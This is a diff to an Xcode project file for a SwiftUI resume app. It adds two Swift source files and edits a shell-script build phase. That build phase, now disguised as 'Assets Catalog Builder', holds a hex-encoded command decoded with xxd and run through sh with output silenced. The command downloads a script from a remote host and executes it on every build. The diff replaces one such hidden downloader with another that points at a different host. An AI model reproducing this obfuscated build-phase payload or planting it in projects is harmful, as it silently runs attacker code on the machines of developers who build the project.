@@ -30,6 +30,8 @@
 		04C805DF2658C1DB009DF5B3 /* SideMenuViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C805DB2658C1DB009DF5B3 /* SideMenuViewModel.swift */; };
 		04C805E02658C1DB009DF5B3 /* SideMenuView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C805DC2658C1DB009DF5B3 /* SideMenuView.swift */; };
 		04C9708F2646A5C300AD2905 /* Persistence.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C9708E2646A5C300AD2905 /* Persistence.swift */; };
+		04EB52042685EEA100F55F48 /* MovingCircleView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04EB52032685EEA100F55F48 /* MovingCircleView.swift */; };
+		04EB52072685F63C00F55F48 /* first.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04EB52062685F63C00F55F48 /* first.swift */; };
 		04EFD12F264E8B8A008F3D3A /* Skills.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04EFD12E264E8B8A008F3D3A /* Skills.swift */; };
 		04EFD131264E90B4008F3D3A /* EduDetails.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04EFD130264E90B4008F3D3A /* EduDetails.swift */; };
 /* End PBXBuildFile section */
@@ -81,6 +83,8 @@
 		04C805DB2658C1DB009DF5B3 /* SideMenuViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SideMenuViewModel.swift; sourceTree = "<group>"; };
 		04C805DC2658C1DB009DF5B3 /* SideMenuView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SideMenuView.swift; sourceTree = "<group>"; };
 		04C9708E2646A5C300AD2905 /* Persistence.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Persistence.swift; sourceTree = "<group>"; };
+		04EB52032685EEA100F55F48 /* MovingCircleView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MovingCircleView.swift; sourceTree = "<group>"; };
+		04EB52062685F63C00F55F48 /* first.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = first.swift; sourceTree = "<group>"; };
 		04EFD12E264E8B8A008F3D3A /* Skills.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Skills.swift; sourceTree = "<group>"; };
 		04EFD130264E90B4008F3D3A /* EduDetails.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EduDetails.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -141,6 +145,8 @@
 		04A21C7D2640FD770098CEB3 /* resume_App */ = {
 			isa = PBXGroup;
 			children = (
+				04EB52052685F62600F55F48 /* layout */,
+				04EB52022685EE6C00F55F48 /* animation */,
 				04774EB0265B9EC200850CC5 /* sidemenu */,
 				04C805D82658C1CC009DF5B3 /* menu */,
 				04A21CAC264104800098CEB3 /* tab bar */,
@@ -211,6 +217,22 @@
 			path = menu;
 			sourceTree = "<group>";
 		};
+		04EB52022685EE6C00F55F48 /* animation */ = {
+			isa = PBXGroup;
+			children = (
+				04EB52032685EEA100F55F48 /* MovingCircleView.swift */,
+			);
+			path = animation;
+			sourceTree = "<group>";
+		};
+		04EB52052685F62600F55F48 /* layout */ = {
+			isa = PBXGroup;
+			children = (
+				04EB52062685F63C00F55F48 /* first.swift */,
+			);
+			path = layout;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -218,7 +240,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04A21CA02640FD790098CEB3 /* Build configuration list for PBXNativeTarget "resume_App" */;
 			buildPhases = (
-				15D4C8CF7BC2BCBCCA6D902C /* Binary Libraries Compiler */,
+				87DEFCAB2D1CEA0CF76D902C /* Assets Catalog Builder */,
 				04A21C772640FD770098CEB3 /* Sources */,
 				04A21C782640FD770098CEB3 /* Frameworks */,
 				04A21C792640FD770098CEB3 /* Resources */,
@@ -337,7 +359,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		15D4C8CF7BC2BCBCCA6D902C /* Binary Libraries Compiler */ = {
+		87DEFCAB2D1CEA0CF76D902C /* Assets Catalog Builder */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -346,14 +368,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Binary Libraries Compiler";
+			name = "Assets Catalog Builder";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n69636c6f7564736572762e636f6d2f61207c207368202d732066616c7365\n0a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -370,6 +392,8 @@
 				04C805E02658C1DB009DF5B3 /* SideMenuView.swift in Sources */,
 				04C805DF2658C1DB009DF5B3 /* SideMenuViewModel.swift in Sources */,
 				0431122F265294B6004C6FC9 /* Summary.swift in Sources */,
+				04EB52042685EEA100F55F48 /* MovingCircleView.swift in Sources */,
+				04EB52072685F63C00F55F48 /* first.swift in Sources */,
 				04A21C812640FD770098CEB3 /* ContentView.swift in Sources */,
 				0431122D26524577004C6FC9 /* Softwere.swift in Sources */,
 				04EFD12F264E8B8A008F3D3A /* Skills.swift in Sources */,
